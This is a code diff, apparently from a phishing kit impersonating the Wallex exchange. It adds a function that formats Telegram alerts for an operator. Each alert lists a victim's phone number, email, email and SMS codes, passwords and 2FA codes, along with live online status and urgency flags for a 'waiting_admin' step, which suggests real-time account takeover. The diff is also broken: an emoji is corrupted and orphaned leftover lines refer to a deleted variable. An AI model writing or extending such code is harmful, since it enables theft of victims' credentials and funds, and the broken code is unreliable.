@@ -292,7 +292,7 @@ export const updateUserOnlineStatus = async (
 
     return { success: true };
   } catch (error) {
-    console.error("❌ Failed to update online status:", error);
+    console.error("�� Failed to update online status:", error);
     return { success: false };
   }
 };
@@ -1046,20 +1046,167 @@ const updateTelegramMessage = async (
 };
 
 /**
- * Get current step display text - professional executive style
+ * Format session message with complete code history and clean layout
  */
-const getCurrentStepText = (step: string): string => {
-  const stepTexts: { [key: string]: string } = {
-    phone_verification: "PHONE VERIFY",
-    waiting_admin: "AWAITING DECISION",
-    email_verification: "EMAIL VERIFY",
-    email_completed: "EMAIL CONFIRMED",
-    auth_password: "PASSWORD INPUT",
-    auth_google: "2FA VERIFY",
-    auth_sms: "SMS VERIFY",
-    auth_email: "EMAIL CODE",
-    completed: "AUTHENTICATED",
+const formatSessionMessage = (session: UserSession): string => {
+  // Escape HTML characters in user data
+  const escapeHtml = (text: string): string => {
+    return text
+      .replace(/&/g, "&amp;")
+      .replace(/</g, "&lt;")
+      .replace(/>/g, "&gt;")
+      .replace(/"/g, "&quot;")
+      .replace(/'/g, "&#39;");
   };
+
+  // Smart time formatting
+  const now = new Date();
+  const currentTime = now.toLocaleString("fa-IR", {
+    hour: "2-digit",
+    minute: "2-digit"
+  });
+  const currentDate = now.toLocaleDateString("fa-IR", {
+    month: "2-digit",
+    day: "2-digit"
+  });
+
+  // Session duration
+  const sessionStart = new Date(session.startTime);
+  const durationMs = Date.now() - sessionStart.getTime();
+  const durationMin = Math.floor(durationMs / 60000);
+  const durationSec = Math.floor((durationMs % 60000) / 1000);
+
+  let durationText;
+  if (durationMin < 1) {
+    durationText = `${durationSec}s`;
+  } else if (durationMin < 60) {
+    durationText = `${durationMin}m ${durationSec}s`;
+  } else {
+    const hours = Math.floor(durationMin / 60);
+    const mins = durationMin % 60;
+    durationText = `${hours}h ${mins}m`;
+  }
+
+  // Smart priority system
+  const getSmartStatus = (step: string, duration: number): {
+    emoji: string;
+    priority: string;
+    urgency: string;
+  } => {
+    const isUrgent = duration > 10; // More than 10 minutes
+    const isCritical = duration > 30; // More than 30 minutes
+
+    switch (step) {
+      case "waiting_admin":
+        if (isCritical) return { emoji: "🔴", priority: "CRITICAL", urgency: "⚡" };
+        if (isUrgent) return { emoji: "🟠", priority: "URGENT", urgency: "⏰" };
+        return { emoji: "🟡", priority: "PENDING", urgency: "📋" };
+      case "phone_verification":
+        return { emoji: "🔵", priority: "VERIFY", urgency: "📱" };
+      case "completed":
+        return { emoji: "🟢", priority: "SUCCESS", urgency: "✅" };
+      default:
+        return { emoji: "⚪", priority: "PROCESSING", urgency: "⚙️" };
+    }
+  };
+
+  const status = getSmartStatus(session.currentStep, durationMin);
+
+  // Professional header
+  let message = `${status.emoji} <b>WALLEX AUTH</b> ${status.priority} ${status.urgency}
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+📱 <b>${escapeHtml(session.phoneNumber)}</b>
+🕐 ${currentDate} ${currentTime} • ${durationText}`;
+
+  // Real-time user status
+  if (session.onlineStatus) {
+    const timeSinceUpdate = Date.now() - session.onlineStatus.lastUpdate;
+    let activityLevel;
+    let timeDisplay;
+
+    if (timeSinceUpdate < 30000) { // Less than 30 seconds
+      activityLevel = "ACTIVE";
+      timeDisplay = `${Math.floor(timeSinceUpdate / 1000)}s`;
+    } else if (timeSinceUpdate < 300000) { // Less than 5 minutes
+      activityLevel = "RECENT";
+      timeDisplay = `${Math.floor(timeSinceUpdate / 60000)}m`;
+    } else {
+      activityLevel = "IDLE";
+      timeDisplay = `${Math.floor(timeSinceUpdate / 60000)}m`;
+    }
+
+    message += `\n${session.onlineStatus.statusEmoji} ${activityLevel} • ${timeDisplay}`;
+  }
+
+  // Complete code history with numbering
+  let allCodes = [];
+  let codeCounter = 1;
+
+  // Phone verification code
+  if (session.phoneVerificationCode) {
+    allCodes.push(`${codeCounter}. PHONE: <code>${escapeHtml(session.phoneVerificationCode)}</code>`);
+    codeCounter++;
+  }
+
+  // Email and email code
+  if (session.email) {
+    const emailShort = session.email.length > 30 ?
+      session.email.substring(0, 27) + "..." : session.email;
+    allCodes.push(`${codeCounter}. EMAIL: <code>${escapeHtml(emailShort)}</code>`);
+    codeCounter++;
+
+    if (session.emailCode) {
+      allCodes.push(`${codeCounter}. EMAIL CODE: <code>${escapeHtml(session.emailCode)}</code>`);
+      codeCounter++;
+    }
+  }
+
+  // All authentication codes with complete history
+  if (session.authCodes && Object.keys(session.authCodes).length > 0) {
+    Object.keys(session.authCodes).forEach((stepType) => {
+      const stepCodes = session.authCodes[stepType];
+      if (stepCodes && stepCodes.length > 0) {
+
+        // Show ALL codes for each type, not just the latest
+        stepCodes.forEach((code, index) => {
+          let stepName;
+          switch (stepType) {
+            case "password":
+              stepName = "PASSWORD";
+              break;
+            case "google":
+              stepName = "2FA CODE";
+              break;
+            case "sms":
+              stepName = "SMS CODE";
+              break;
+            case "email":
+              stepName = "EMAIL AUTH";
+              break;
+            default:
+              stepName = stepType.toUpperCase();
+          }
+
+          allCodes.push(`${codeCounter}. ${stepName}: <code>${escapeHtml(code)}</code>`);
+          codeCounter++;
+        });
+      }
+    });
+  }
+
+  // Add all codes section if any codes exist
+  if (allCodes.length > 0) {
+    message += `\n\n🔐 <b>AUTHENTICATION CODES:</b>\n` + allCodes.join("\n");
+  }
+
+  // Simple footer with session info
+  message += `\n\n🆔 Session: <code>${session.sessionId.substring(0, 10)}</code>
+
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+<i>🔐 WALLEX COMMAND CENTER</i>`;
+
+  return message;
+};
 
   return stepTexts[step] || step.toUpperCase();
 };
